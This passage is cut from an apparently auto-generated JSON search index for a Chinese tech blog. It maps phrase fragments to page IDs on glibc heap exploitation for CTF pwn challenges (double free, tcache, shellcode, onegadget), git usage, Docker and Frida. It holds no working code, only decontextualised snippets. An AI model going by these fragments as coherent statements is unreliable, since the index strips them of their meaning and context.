入数据覆盖到chunk\",{\"1\":{\"153\":1}}],[\"写入刚好size大小的数据\",{\"1\":{\"87\":1}}],[\"写一个计算chunk大小的程序\",{\"0\":{\"73\":1}}],[\"写得很好\",{\"1\":{\"60\":1}}],[\"写明如何想要进入我们的项目\",{\"1\":{\"7\":1}}],[\"掉revert我merge\",{\"1\":{\"60\":1}}],[\"就和arahat0师傅文章中的流程一模一样\",{\"1\":{\"288\":1}}],[\"就可以实现malloc下来一个任意地址\",{\"1\":{\"273\":1}}],[\"就可以实现shellcode的写入\",{\"1\":{\"267\":1}}],[\"就可以获取flag\",{\"1\":{\"269\":1}}],[\"就可以成功劫持了\",{\"1\":{\"261\":1}}],[\"就可以利用合并机制\",{\"1\":{\"87\":1}}],[\"就像是\",{\"1\":{\"236\":1}}],[\"就记录下来\",{\"1\":{\"140\":1}}],[\"就会来top\",{\"1\":{\"132\":1}}],[\"就进入fastbin\",{\"1\":{\"120\":1}}],[\"就作为上一个chunk的一部分来存数据\",{\"1\":{\"114\":1}}],[\"就合并\",{\"1\":{\"109\":1}}],[\"就获取下一个chunk的指针\",{\"1\":{\"109\":1}}],[\"就直接分割\",{\"1\":{\"98\":1}}],[\"就相当于我们向里面注册会堵塞的事件\",{\"1\":{\"64\":1}}],[\"就不能直接git\",{\"1\":{\"60\":1}}],[\"就是rsp+8\",{\"1\":{\"264\":1}}],[\"就是我们劫持的头chunk\",{\"1\":{\"162\":1,\"284\":1}}],[\"就是利用一次合并机制和分割机制\",{\"1\":{\"153\":1}}],[\"就是新获得unsroted\",{\"1\":{\"143\":1}}],[\"就是算偏移嘛\",{\"1\":{\"23\":1}}],[\"就是在这个类实列化的时候\",{\"1\":{\"20\":1}}],[\"就是同一个函数名字\",{\"1\":{\"19\":1}}],[\"方便我们理解我们patchelf要修改哪些东西\",{\"1\":{\"238\":1}}],[\"方便我们取出名字\",{\"1\":{\"236\":1}}],[\"方便我们了解\",{\"1\":{\"234\":1}}],[\"方便我们直观看见\",{\"1\":{\"187\":1}}],[\"方便我们进行调用\",{\"1\":{\"186\":1}}],[\"方便我们进行处理\",{\"1\":{\"186\":1}}],[\"方便我们去劫持exit\",{\"1\":{\"163\":1,\"285\":1}}],[\"方便我们去分析源码\",{\"1\":{\"35\":1}}],[\"方便以后查看\",{\"1\":{\"60\":1}}],[\"为onegadget即可\",{\"1\":{\"259\":1}}],[\"为\",{\"1\":{\"170\":1}}],[\"为触发泄露tls+0x30的double\",{\"1\":{\"162\":1,\"284\":1}}],[\"为了实验一下\",{\"1\":{\"255\":1}}],[\"为了让编译器能够找到对应的动态库ld\",{\"1\":{\"238\":1}}],[\"为了深入\",{\"1\":{\"183\":1}}],[\"为了不影响后续的heap计算就没有删除\",{\"1\":{\"163\":1,\"285\":1}}],[\"为了绕过isused的检测\",{\"1\":{\"159\":1,\"281\":1}}],[\"为了图片干净一点\",{\"1\":{\"93\":1}}],[\"为了代码的可读性以及逻辑的连贯性\",{\"1\":{\"65\":1}}],[\"为了安全的\",{\"1\":{\"57\":1}}],[\"为主线\",{\"1\":{\"59\":1}}],[\"qemu\",{\"1\":{\"270\":3}}],[\"q\",{\"1\":{\"249\":2}}],[\"quiet\",{\"1\":{\"249\":1}}],[\"quickly\",{\"1\":{\"109\":1}}],[\"quit\",{\"1\":{\"27\":1,\"249\":2}}],[\"qword\",{\"1\":{\"77\":1}}],[\"qq\",{\"1\":{\"58\":1}}],[\"逆向commit\",{\"1\":{\"58\":1}}],[\"旨在跟踪文件的每个版本\",{\"1\":{\"58\":1}}],[\"从路径\",{\"1\":{\"238\":1}}],[\"从而来泄露出key值\",{\"1\":{\"163\":1,\"285\":1}}],[\"从而实现double\",{\"1\":{\"157\":1,\"279\":1}}],[\"从空闲链表中获取一个分配区\",{\"1\":{\"137\":1}}],[\"从thread\",{\"1\":{\"136\":1}}],[\"从topchunk中获取chunk\",{\"0\":{\"108\":1}}],[\"从0x20到0x410\",{\"1\":{\"123\":1}}],[\"从libc2\",{\"1\":{\"123\":1}}],[\"从largebin中获取chunk\",{\"0\":{\"105\":1}}],[\"从glibc2\",{\"1\":{\"115\":1}}],[\"从shared\",{\"1\":{\"112\":1}}],[\"从heap下方的data段\",{\"1\":{\"112\":1}}],[\"从unsortedbin中移除\",{\"0\":{\"99\":1}}],[\"从unsorted\",{\"1\":{\"95\":1}}],[\"从\",{\"1\":{\"58\":1,\"238\":2}}],[\"详解\",{\"1\":{\"57\":1}}],[\"详细看下方图\",{\"1\":{\"150\":1}}],[\"详细看intent的各种action\",{\"1\":{\"39\":1}}],[\"详细拆分了\",{\"1\":{\"92\":1}}],[\"详细说明intent\",{\"1\":{\"36\":1}}],[\"中被使用\",{\"1\":{\"234\":1}}],[\"中push\",{\"1\":{\"234\":1}}],[\"中一条链已经存在一个无效的chunk地址\",{\"1\":{\"165\":1,\"287\":1}}],[\"中\",{\"1\":{\"109\":1,\"234\":3}}],[\"中记录前一个\",{\"1\":{\"97\":1}}],[\"中bk值\",{\"1\":{\"91\":1}}],[\"中的一个函数\",{\"1\":{\"243\":1}}],[\"中的这个n\",{\"1\":{\"236\":1}}],[\"中的\",{\"1\":{\"207\":1}}],[\"中的显示前一个\",{\"1\":{\"97\":1}}],[\"中的num获取chunk的size\",{\"1\":{\"73\":1}}],[\"中的空闲\",{\"1\":{\"69\":1}}],[\"中合要去除的commit\",{\"1\":{\"58\":1}}],[\"中删除提交\",{\"1\":{\"57\":1}}],[\"中出现了调用原本的函数\",{\"1\":{\"18\":1}}],[\"于是还是写上\",{\"1\":{\"57\":1}}],[\"于是学习一下如何用git安全地去除\",{\"1\":{\"57\":1}}],[\"本来想的是每次用两字节操作两字节跳转到下一个可执行区域\",{\"1\":{\"267\":1}}],[\"本来不足以写成一篇博文的\",{\"1\":{\"57\":1}}],[\"本地bss没有可执行权限但是远程有\",{\"1\":{\"270\":1}}],[\"本地打这个感觉还行\",{\"1\":{\"165\":1,\"287\":1}}],[\"本地地址\",{\"1\":{\"43\":2}}],[\"而且没有对content\",{\"1\":{\"274\":1}}],[\"而且经过测试仿佛这里的base\",{\"1\":{\"163\":1,\"285\":1}}],[\"而且我觉得自己手动查看上次的commit内容并且删除对应文件有点麻烦\",{\"1\":{\"57\":1}}],[\"而在fastbin为空时\",{\"1\":{\"69\":1}}],[\"而是只允许我以r方式打开\",{\"1\":{\"288\":1}}],[\"而是横向滚动显示\",{\"1\":{\"249\":1}}],[\"而是我们先revert掉g\",{\"1\":{\"60\":1}}],[\"而是先revert\",{\"1\":{\"60\":1}}],[\"而不是class\",{\"1\":{\"30\":1}}],[\"但是前五个isused为0\",{\"1\":{\"276\":1}}],[\"但是好像显然不太对所以我们这里干脆用idapython在ida里面提取出来\",{\"1\":{\"255\":1}}],[\"但是好像可以用命令行来解决这个问题比如我们这里用指令\",{\"1\":{\"230\":1}}],[\"但是功能较少\",{\"1\":{\"249\":1}}],[\"但是其实这里r\",{\"1\":{\"236\":1}}],[\"但是其内容不可被修改\",{\"1\":{\"184\":1}}],[\"但是它指向的内容是不可变的\",{\"1\":{\"184\":1}}],[\"但是指针指向的内容是可以修改的\",{\"1\":{\"184\":1}}],[\"但是打远程的时候我脚本足足要跑20分钟\",{\"1\":{\"165\":1,\"287\":1}}],[\"但是后面切换了思路没有用了\",{\"1\":{\"163\":1,\"285\":1}}],[\"但是同时也会导致缓冲区一堆数据导致后续的scanf失灵\",{\"1\":{\"161\":1,\"283\":1}}],[\"但是现在就要想办法触发fastbin中的合并机制了\",{\"1\":{\"160\":1,\"282\":1}}],[\"但是此时保留了fd\",{\"1\":{\"158\":1,\"280\":1}}],[\"但是为了方便理解我们选择倒推的方式\",{\"1\":{\"153\":1}}],[\"但是我们访问的内存高达20位所以我们采用ds寄存器+便宜的位置完成剩下4位的补充\",{\"1\":{\"220\":1}}],[\"但是我忽略了\",{\"1\":{\"145\":1}}],[\"但是我感觉以后我可能忘记\",{\"1\":{\"57\":1}}],[\"但是觉得还是学了东西\",{\"1\":{\"140\":1}}],[\"但是calloc是不会拿tcache的\",{\"1\":{\"125\":1}}],[\"但是没有清空\",{\"1\":{\"78\":1}}],[\"但是写太多bug了被revert了\",{\"1\":{\"60\":1}}],[\"但是这个commit带了bug\",{\"1\":{\"57\":1}}],[\"但是ping\",{\"1\":{\"46\":1}}],[\"目的\",{\"0\":{\"57\":1}}],[\"发布说明\",{\"1\":{\"55\":1}}],[\"发现不太现实\",{\"1\":{\"267\":1}}],[\"发现了import无效指令\",{\"1\":{\"248\":1}}],[\"发现主要用在加密input上面\",{\"1\":{\"245\":1}}],[\"发现frida在新版本中移除了\",{\"1\":{\"27\":1}}],[\"发现其实readme也比较重要\",{\"1\":{\"1\":1}}],[\"给你的批阅者的特别注意事项\",{\"1\":{\"55\":1}}],[\"说明初始值是feifei\",{\"1\":{\"245\":1}}],[\"说明所有的\",{\"1\":{\"188\":1}}],[\"说明你的pr的作用\",{\"1\":{\"55\":1}}],[\"说明intent\",{\"1\":{\"36\":1}}],[\"良好的审查机制\",{\"1\":{\"54\":1}}],[\"良好的代码提交规范可以帮助团队成员更好地理解和维护代码库\",{\"1\":{\"48\":1}}],[\"和mips一模一样\",{\"1\":{\"271\":1}}],[\"和jmp\",{\"1\":{\"234\":1}}],[\"和open等函数操作的文件\",{\"1\":{\"185\":1}}],[\"和heap地址\",{\"1\":{\"157\":1,\"279\":1}}],[\"和chunk6的fd指向我们构造的chunk\",{\"1\":{\"150\":1}}],[\"和chunk4\",{\"1\":{\"150\":1}}],[\"和chunk\",{\"1\":{\"150\":1,\"154\":1}}],[\"和bk\",{\"1\":{\"114\":1,\"150\":1}}],[\"和victim\",{\"1\":{\"110\":1}}],[\"和fwrite函数需要文件流指针调用虚表函数\",{\"1\":{\"185\":1}}],[\"和foot\",{\"1\":{\"109\":1}}],[\"和fd\",{\"1\":{\"104\":1}}],[\"和size两个部分\",{\"1\":{\"114\":1}}],[\"和size\",{\"1\":{\"109\":1}}],[\"和size的地方\",{\"1\":{\"109\":1}}],[\"和名字表达的意思一样\",{\"1\":{\"65\":1}}],[\"和\",{\"0\":{\"102\":1,\"132\":1,\"241\":1},\"1\":{\"53\":1}}],[\"一次性4字节shellcode空间\",{\"1\":{\"267\":1}}],[\"一筹莫展\",{\"1\":{\"248\":1}}],[\"一对应\",{\"1\":{\"234\":1}}],[\"一\",{\"1\":{\"234\":1}}],[\"一会儿思维就通了\",{\"1\":{\"187\":1}}],[\"一种新的glibc中io攻击方法\",{\"1\":{\"167\":1,\"178\":1,\"182\":1}}],[\"一种是直接revert\",{\"1\":{\"59\":1}}],[\"一共两个部分\",{\"1\":{\"123\":1}}],[\"一共有64个bins\",{\"1\":{\"70\":1}}],[\"一般开发的时候\",{\"1\":{\"185\":1}}],[\"一般小内存\",{\"1\":{\"132\":1}}],[\"一般申请较大的内存空间\",{\"1\":{\"112\":1}}],[\"一般是prev\",{\"1\":{\"114\":1}}],[\"一般是填写一个表格\",{\"1\":{\"55\":1}}],[\"一般是master\",{\"1\":{\"53\":1}}],[\"一道题彻底理解\",{\"1\":{\"80\":1}}],[\"一个栈迁移\",{\"1\":{\"270\":1}}],[\"一个在\",{\"1\":{\"181\":1}}],[\"一个chunk\",{\"1\":{\"150\":1,\"223\":1}}],[\"一个分配区可以给多个线程使用\",{\"1\":{\"132\":1}}],[\"一个是对应链表的元素数量\",{\"1\":{\"123\":1}}],[\"一个是对应大小的tcache\",{\"1\":{\"123\":1}}],[\"一个gundam包含两个chunk\",{\"1\":{\"72\":1}}],[\"一个测试脚本\",{\"0\":{\"27\":1}}],[\"一个好看的电子书网站\",{\"1\":{\"9\":1}}],[\"顺便可以提供上下文信息\",{\"1\":{\"51\":1}}],[\"修复问题的编号\",{\"1\":{\"55\":1}}],[\"修复bug\",{\"1\":{\"53\":1}}],[\"修复登录页面显示问题\",{\"1\":{\"51\":1}}],[\"修改其fd\",{\"1\":{\"273\":1}}],[\"修改malloc\",{\"1\":{\"259\":1,\"260\":1}}],[\"修改libc的地址\",{\"1\":{\"241\":2}}],[\"修改ld的地址\",{\"1\":{\"241\":1}}],[\"修改程序的\",{\"0\":{\"241\":1}}],[\"修改这两个值就可以实现任意地址的修改\",{\"1\":{\"216\":1}}],[\"修改值\",{\"1\":{\"202\":1}}],[\"修改思路\",{\"0\":{\"144\":1}}],[\"修改每个对象的字段\",{\"1\":{\"21\":1}}],[\"修改非静态字段\",{\"1\":{\"21\":1}}],[\"修改静态字段\",{\"1\":{\"21\":1}}],[\"修改类字段\",{\"1\":{\"21\":1}}],[\"修改类的字段\",{\"0\":{\"21\":1}}],[\"修改参数\",{\"1\":{\"17\":1,\"19\":1}}],[\"如颜色代码\",{\"1\":{\"249\":1}}],[\"如果字符串长度小于等于所需长度\",{\"1\":{\"288\":1}}],[\"如果free则是free\",{\"1\":{\"276\":1}}],[\"如果文件内容能够在一屏内显示完毕\",{\"1\":{\"249\":1}}],[\"如果文件头中存在pt\",{\"1\":{\"239\":1}}],[\"如果不关心退出状态\",{\"1\":{\"243\":1}}],[\"如果不存在dt\",{\"1\":{\"238\":1}}],[\"如果此值为\",{\"1\":{\"243\":1}}],[\"如果大小合适会直接从这三十个slot中分配\",{\"1\":{\"223\":1}}],[\"如果验证失败则中止进程\",{\"1\":{\"213\":1}}],[\"如果要详细了解一下就看文章后面调试深入理解部分的内容\",{\"1\":{\"187\":1}}],[\"如果只是想要懂个流程就是浏览一下这部分就行\",{\"1\":{\"187\":1}}],[\"如果只想看重点就直接跳转到largebin入链操作\",{\"1\":{\"93\":1}}],[\"如果直接将fd填写为tls处地址\",{\"1\":{\"163\":1,\"285\":1}}],[\"如果空闲链表中有该分配区\",{\"1\":{\"137\":1}}],[\"如果成功则加锁\",{\"1\":{\"136\":1}}],[\"如果无的话\",{\"1\":{\"134\":1}}],[\"如果存在直接加锁\",{\"1\":{\"134\":1}}],[\"如果下一块chunk是top\",{\"1\":{\"128\":1}}],[\"如果下一个chunk不为top\",{\"1\":{\"109\":1}}],[\"如果一样提示double\",{\"1\":{\"127\":1}}],[\"如果一个大小的chunk链表中有多个chunk\",{\"1\":{\"106\":1}}],[\"如果size小于get\",{\"1\":{\"120\":1}}],[\"如果有合适的就直接给\",{\"1\":{\"115\":1}}],[\"如果有关联的issue就把issue的编号写出来\",{\"1\":{\"51\":1}}],[\"如果现在我们能够修改largebin中fwd位置的chunk\",{\"1\":{\"110\":1}}],[\"如果当前chunk的p为0也就是下一个chunk为freechunk则进行合并\",{\"1\":{\"109\":1}}],[\"如果当前chunk比最后一位chunk还小则直接加入链表末尾\",{\"1\":{\"104\":1}}],[\"如果通过nextchunk查看下一个chunk是free状态\",{\"1\":{\"109\":1}}],[\"如果为top\",{\"1\":{\"109\":1}}],[\"如果取出来的chunk下一个chunk也是free\",{\"1\":{\"109\":1}}],[\"如果前一个chunk空闲\",{\"1\":{\"109\":1}}],[\"如果释放的chunk不属于fastbin\",{\"1\":{\"109\":1}}],[\"如果是主线程\",{\"1\":{\"136\":1}}],[\"如果是fastbin区间的\",{\"1\":{\"109\":1}}],[\"如果是remiander\",{\"1\":{\"106\":1}}],[\"如果topchunk不够就去系统申请\",{\"1\":{\"108\":1}}],[\"如果没有指定文件\",{\"1\":{\"249\":1}}],[\"如果没有则加到对齐\",{\"1\":{\"74\":1}}],[\"如果没找到就去topchunk分配\",{\"1\":{\"108\":1}}],[\"如果切割的chunk\",{\"1\":{\"106\":1}}],[\"如果该chunk与当前chunk相同则让chunk插入fwd之后\",{\"1\":{\"104\":1}}],[\"如果属于large\",{\"1\":{\"104\":1}}],[\"如果属于small\",{\"1\":{\"103\":1}}],[\"如果开启了tcache机制\",{\"1\":{\"100\":1}}],[\"如果chunk和当前需要的chunk大小一致\",{\"1\":{\"100\":1}}],[\"如果符合条件\",{\"1\":{\"98\":1}}],[\"如果\",{\"1\":{\"97\":2,\"137\":1}}],[\"如果小于则直接等于0x20\",{\"1\":{\"74\":1}}],[\"如何解释序列和字段分隔符\",{\"1\":{\"251\":1}}],[\"如何查\",{\"0\":{\"118\":1}}],[\"如何实现\",{\"1\":{\"110\":1}}],[\"如何从\",{\"1\":{\"57\":1}}],[\"如何降低docker里面的gcc版本\",{\"1\":{\"41\":1}}],[\"如何使用\",{\"1\":{\"4\":1}}],[\"如何安装\",{\"1\":{\"4\":1}}],[\"文件可写\",{\"1\":{\"211\":1}}],[\"文件流\",{\"1\":{\"185\":1}}],[\"文章中我们先讲原理\",{\"1\":{\"146\":1}}],[\"文章中推荐的主力pwn环境是\",{\"1\":{\"44\":1}}],[\"文章\",{\"1\":{\"62\":1}}],[\"文章说的\",{\"1\":{\"58\":1}}],[\"文档的变更\",{\"1\":{\"50\":1}}],[\"功能\",{\"1\":{\"50\":1}}],[\"新建标签页\",{\"1\":{\"268\":1}}],[\"新的fake\",{\"1\":{\"231\":1}}],[\"新申请的分配区都会放入主分配区的下一个位置\",{\"1\":{\"138\":1}}],[\"新加入的分配区放main\",{\"1\":{\"132\":2}}],[\"新增特性\",{\"1\":{\"50\":1}}],[\"新手入门必备\",{\"1\":{\"41\":1}}],[\"添加用户注册功能\",{\"1\":{\"50\":1}}],[\"格式\",{\"0\":{\"50\":1}}],[\"格式为\",{\"1\":{\"48\":1}}],[\"结构体的指针\",{\"1\":{\"243\":1}}],[\"结构体\",{\"0\":{\"174\":1,\"175\":1,\"176\":1}}],[\"结构图\",{\"1\":{\"71\":1}}],[\"结合偏移值从而得到libc的加载地址\",{\"1\":{\"69\":1}}],[\"结合cubefs社区的提交规范进行的总结\",{\"1\":{\"48\":1}}],[\"结果发现想复杂了\",{\"1\":{\"268\":1}}],[\"结果加速器一关久解决好了\",{\"1\":{\"46\":1}}],[\"结果没办法解决\",{\"1\":{\"43\":1}}],[\"结果\",{\"0\":{\"145\":1},\"1\":{\"20\":1,\"43\":2}}],[\"描述清楚修改的内容\",{\"1\":{\"51\":1}}],[\"描述\",{\"1\":{\"48\":1,\"50\":1}}],[\"类似于这样\",{\"1\":{\"246\":1}}],[\"类似于进程中的\",{\"1\":{\"243\":1}}],[\"类似文章中举列子的一样\",{\"1\":{\"19\":1}}],[\"类型\",{\"1\":{\"48\":1,\"50\":2}}],[\"尽量保持提交频率较小\",{\"1\":{\"48\":1}}],[\"~0u\",{\"1\":{\"124\":1}}],[\"~0xf\",{\"1\":{\"74\":1,\"75\":1}}],[\"~\",{\"1\":{\"48\":1,\"97\":1}}],[\"阿里云开发者社区\",{\"1\":{\"48\":1}}],[\"项目上传一个commit\",{\"1\":{\"57\":1}}],[\"项目提交规范学习\",{\"0\":{\"48\":1}}],[\"项目背景\",{\"0\":{\"3\":1}}],[\"与less类似\",{\"1\":{\"249\":1}}],[\"与got\",{\"1\":{\"234\":1}}],[\"与chun2\",{\"1\":{\"150\":1}}],[\"与安全检查\",{\"1\":{\"106\":1}}],[\"与bk\",{\"1\":{\"81\":1}}],[\"与\",{\"0\":{\"48\":1},\"1\":{\"97\":1}}],[\"支持多版本共存\",{\"1\":{\"47\":1}}],[\"是一个特殊的\",{\"1\":{\"251\":1}}],[\"是一个用于分割字段的字符列表\",{\"1\":{\"250\":1}}],[\"是一个或多个文件名\",{\"1\":{\"249\":1}}],[\"是一种文本编辑器\",{\"1\":{\"249\":1}}],[\"是调用\",{\"1\":{\"243\":1}}],[\"是缓冲区起始位置\",{\"1\":{\"211\":1}}],[\"是作为全局变量储存在\",{\"1\":{\"207\":1}}],[\"是不能被销毁的\",{\"1\":{\"138\":1}}],[\"是bins的一个缓冲区\",{\"1\":{\"132\":1}}],[\"是决定是我们的操作\",{\"1\":{\"118\":1}}],[\"是free状态\",{\"1\":{\"109\":1}}],[\"是3\",{\"1\":{\"47\":1}}],[\"是否切割后的chunk大于minsize\",{\"1\":{\"106\":1}}],[\"是否正在使用的标志位为1\",{\"1\":{\"97\":1}}],[\"是否等于当前的chunk\",{\"1\":{\"97\":1}}],[\"是否可以使用debug调试\",{\"1\":{\"37\":1}}],[\"是否给用户删除数据的权限\",{\"1\":{\"37\":1}}],[\"是否有类似项目\",{\"1\":{\"5\":1}}],[\"因为在free\",{\"1\":{\"275\":1}}],[\"因为在阅读文章的时候\",{\"1\":{\"41\":1}}],[\"因为存在off\",{\"1\":{\"273\":1}}],[\"因为refq不支持跳转超过四字节的地址\",{\"1\":{\"268\":1}}],[\"因为\",{\"1\":{\"231\":1}}],[\"因为大多数时候我都是去ida直接找的这个gadget\",{\"1\":{\"230\":1}}],[\"因为已经遇到了很多次了\",{\"1\":{\"229\":1}}],[\"因为x86下的cpu寄存器就是16位\",{\"1\":{\"220\":1}}],[\"因为上一次double\",{\"1\":{\"165\":1,\"287\":1}}],[\"因为tls处的fd位置我们并没有办法控制\",{\"1\":{\"163\":1,\"285\":1}}],[\"因为题目中存在isused\",{\"1\":{\"157\":1,\"279\":1}}],[\"因为scanf在接受大量数据的时候会申请一个largebin\",{\"1\":{\"157\":1,\"279\":1}}],[\"因为smallbin和largebin的入链操作都含这个代码\",{\"1\":{\"102\":1}}],[\"因为其实是我们专门计算的0x550这个数据\",{\"1\":{\"153\":1}}],[\"因为修改chunk\",{\"1\":{\"152\":1}}],[\"因为当tcache\",{\"1\":{\"143\":1}}],[\"因为如果unsorted\",{\"1\":{\"143\":1}}],[\"因为要绕过unlink的安全检查\",{\"1\":{\"130\":1}}],[\"因为还有prev\",{\"1\":{\"124\":1}}],[\"因为我们使用的栈其实本质就是基于rbp\",{\"1\":{\"231\":1}}],[\"因为我们常使用leave\",{\"1\":{\"231\":1}}],[\"因为我们用的是平坦模式\",{\"1\":{\"220\":1}}],[\"因为我们需要劫持这个链表所以我们需要再一次触发fastbin的合并构造double\",{\"1\":{\"165\":1,\"287\":1}}],[\"因为我们刚才构造的fake\",{\"1\":{\"153\":1}}],[\"因为我们可以利用下一面一个chunk的prev\",{\"1\":{\"115\":1}}],[\"因为我使用git比较随性\",{\"1\":{\"48\":1}}],[\"因为large\",{\"1\":{\"104\":1}}],[\"因为largebin是按照大小进行的排序\",{\"1\":{\"104\":1}}],[\"因为是最新的commit\",{\"1\":{\"61\":1}}],[\"因为这题用的两个全局变量来存储的使用情况和chunk地址\",{\"1\":{\"273\":1}}],[\"因为这些寄存器会在\",{\"1\":{\"234\":1}}],[\"因为这次我的问题其实不属于这种情况但是还是写下来\",{\"1\":{\"60\":1}}],[\"因为这个版本之下没有tcache作为一些原理\",{\"1\":{\"47\":1}}],[\"因为从git中删除一个commit这通常是一个坏主意\",{\"1\":{\"58\":1}}],[\"759\",{\"1\":{\"288\":1}}],[\"758\",{\"1\":{\"165\":1,\"287\":1}}],[\"719\",{\"1\":{\"288\":1}}],[\"7856\",{\"1\":{\"288\":1}}],[\"782\",{\"1\":{\"46\":1}}],[\"720\",{\"1\":{\"273\":1}}],[\"721\",{\"1\":{\"273\":1}}],[\"72548352\",{\"1\":{\"196\":1}}],[\"7是占用状态\",{\"1\":{\"273\":1}}],[\"7$d\",{\"1\":{\"264\":1}}],[\"7$ld\",{\"1\":{\"263\":1,\"264\":1}}],[\"760\",{\"1\":{\"161\":1,\"283\":1}}],[\"7c0\",{\"1\":{\"150\":1,\"154\":1}}],[\"7个chunk\",{\"1\":{\"87\":1}}],[\"7\",{\"1\":{\"47\":1,\"150\":1,\"154\":1,\"161\":1,\"163\":2,\"165\":3,\"182\":1,\"189\":1,\"222\":1,\"246\":1,\"249\":1,\"260\":5,\"266\":1,\"273\":5,\"276\":2,\"283\":1,\"285\":2,\"287\":3,\"288\":14,\"289\":1}}],[\"77\",{\"1\":{\"43\":1}}],[\"找出程序依赖的所有共享库\",{\"1\":{\"239\":1}}],[\"找到了大佬的blog感觉摸到了皮毛\",{\"1\":{\"183\":1}}],[\"找到刚好大于等于我们所需chunk\",{\"1\":{\"106\":1}}],[\"找到我们需要的libc版本进行下载即可\",{\"1\":{\"47\":1}}],[\"找到解决文章\",{\"1\":{\"43\":1}}],[\"找了很多文章都没有解决\",{\"1\":{\"46\":1}}],[\"53647\",{\"1\":{\"290\":1}}],[\"53235\",{\"1\":{\"264\":1}}],[\"50\",{\"1\":{\"289\":1}}],[\"50176\",{\"1\":{\"270\":1}}],[\"57621\",{\"1\":{\"271\":1}}],[\"57次\",{\"1\":{\"268\":1}}],[\"52689\",{\"1\":{\"269\":1}}],[\"52pojie\",{\"1\":{\"36\":1}}],[\"557bbe9bf2e9\",{\"1\":{\"245\":1}}],[\"557bbe9bf803\",{\"1\":{\"244\":1}}],[\"557bbe9c22c0\",{\"1\":{\"244\":1}}],[\"557bbe9c22a0\",{\"1\":{\"244\":1}}],[\"557bbe9c2280\",{\"1\":{\"244\":1,\"245\":2}}],[\"5触发合并机制\",{\"1\":{\"153\":1}}],[\"5的prev\",{\"1\":{\"153\":1}}],[\"5出来\",{\"1\":{\"152\":1}}],[\"5版本\",{\"1\":{\"47\":1}}],[\"5\",{\"1\":{\"46\":1,\"77\":1,\"150\":1,\"152\":2,\"153\":1,\"154\":3,\"158\":1,\"163\":2,\"165\":1,\"182\":1,\"221\":1,\"244\":1,\"246\":2,\"249\":3,\"273\":1,\"276\":2,\"280\":1,\"285\":2,\"287\":1,\"288\":3}}],[\"进行修改一些已经进入bin链的chunk\",{\"1\":{\"273\":1}}],[\"进行覆写\",{\"1\":{\"165\":1,\"287\":1}}],[\"进行异或操作\",{\"1\":{\"163\":1,\"285\":1}}],[\"进行2\",{\"1\":{\"109\":1}}],[\"进行unlink操作\",{\"1\":{\"106\":1,\"109\":1}}],[\"进行内存释放时\",{\"1\":{\"69\":1}}],[\"进行hook\",{\"1\":{\"30\":1}}],[\"进入open64\",{\"0\":{\"190\":1}}],[\"进入\",{\"1\":{\"77\":1}}],[\"进入后使用apt发生报错\",{\"1\":{\"46\":1}}],[\"进入docker\",{\"1\":{\"43\":1}}],[\"49979\",{\"1\":{\"288\":1}}],[\"456\",{\"1\":{\"268\":1}}],[\"48\",{\"1\":{\"265\":1}}],[\"4h\",{\"1\":{\"254\":1,\"255\":1}}],[\"44\",{\"1\":{\"254\":1}}],[\"4的2mb\",{\"1\":{\"223\":1}}],[\"4+p64\",{\"1\":{\"165\":1,\"287\":1}}],[\"4096\",{\"1\":{\"289\":1}}],[\"40h\",{\"1\":{\"244\":1}}],[\"40\",{\"1\":{\"77\":4}}],[\"403fa820f3bc49c2fdf37a4f0419fac2\",{\"1\":{\"58\":1}}],[\"4007f4\",{\"1\":{\"255\":1}}],[\"400\",{\"1\":{\"46\":6}}],[\"41348000h\",{\"1\":{\"255\":1}}],[\"413\",{\"1\":{\"46\":1}}],[\"41\",{\"1\":{\"46\":1,\"255\":1}}],[\"4\",{\"1\":{\"43\":2,\"46\":1,\"150\":1,\"153\":3,\"154\":4,\"165\":1,\"174\":1,\"182\":1,\"246\":1,\"247\":1,\"249\":1,\"256\":1,\"258\":1,\"260\":1,\"264\":1,\"265\":1,\"266\":1,\"267\":3,\"268\":1,\"269\":2,\"271\":1,\"273\":2,\"276\":4,\"287\":1,\"288\":4,\"289\":1,\"290\":1}}],[\"标识各page是否已分配的bitmap数组\",{\"1\":{\"223\":1}}],[\"标准输入\",{\"1\":{\"43\":1}}],[\"标签\",{\"1\":{\"37\":1}}],[\"镜像名称\",{\"1\":{\"43\":1}}],[\"镜像的标识\",{\"1\":{\"43\":1}}],[\"容器启动后直接进入命令行\",{\"1\":{\"43\":1}}],[\"容器名称\",{\"1\":{\"43\":1}}],[\"容器端口\",{\"1\":{\"43\":1}}],[\"宿主机端口\",{\"1\":{\"43\":1}}],[\"ywhkkx\",{\"1\":{\"222\":2}}],[\"yet\",{\"1\":{\"137\":1}}],[\"years\",{\"1\":{\"43\":1}}],[\"yield\",{\"1\":{\"66\":2}}],[\"your\",{\"1\":{\"55\":1,\"143\":1,\"144\":1,\"241\":1,\"258\":4,\"266\":2,\"267\":1,\"268\":3}}],[\"you\",{\"1\":{\"0\":1,\"154\":1,\"180\":3}}],[\"9个128\",{\"1\":{\"157\":1,\"279\":1}}],[\"9527\",{\"1\":{\"46\":4}}],[\"94\",{\"1\":{\"46\":4}}],[\"936a687b2420\",{\"1\":{\"46\":2}}],[\"9\",{\"1\":{\"43\":1,\"47\":1,\"158\":2,\"246\":1,\"260\":6,\"280\":2,\"288\":8}}],[\"9mb\",{\"1\":{\"43\":1}}],[\"怪\",{\"1\":{\"43\":1}}],[\"继续报错\",{\"1\":{\"43\":1}}],[\"桌面版报错error\",{\"1\":{\"43\":1}}],[\"以及value的部分\",{\"1\":{\"246\":1}}],[\"以及最容易理解错的是\",{\"1\":{\"231\":1}}],[\"以及我们发现这里调用的是\",{\"1\":{\"180\":1}}],[\"以及chunk5\",{\"1\":{\"152\":1}}],[\"以及指针原本的位置\",{\"1\":{\"143\":1,\"144\":1}}],[\"以及\",{\"1\":{\"110\":1}}],[\"以及内存对齐\",{\"1\":{\"109\":1}}],[\"以及其他的复杂检查\",{\"1\":{\"102\":1}}],[\"以及git\",{\"1\":{\"58\":1}}],[\"以及对应的解决方法\",{\"1\":{\"43\":1}}],[\"以下是一些常见的git代码提交规范\",{\"1\":{\"48\":1}}],[\"以便于交互\",{\"1\":{\"16\":1}}],[\"操作指令\",{\"0\":{\"43\":1}}],[\"33168\",{\"1\":{\"289\":1}}],[\"33\",{\"1\":{\"247\":1}}],[\"30\",{\"1\":{\"246\":1,\"273\":2}}],[\"30h\",{\"1\":{\"244\":1,\"254\":1}}],[\"301082\",{\"1\":{\"30\":8}}],[\"3ch\",{\"1\":{\"244\":1}}],[\"35版本下有fd加密\",{\"1\":{\"276\":1}}],[\"35494\",{\"1\":{\"266\":1}}],[\"35\",{\"1\":{\"161\":1,\"167\":1,\"283\":1}}],[\"35下存在fd加密机制\",{\"1\":{\"163\":1,\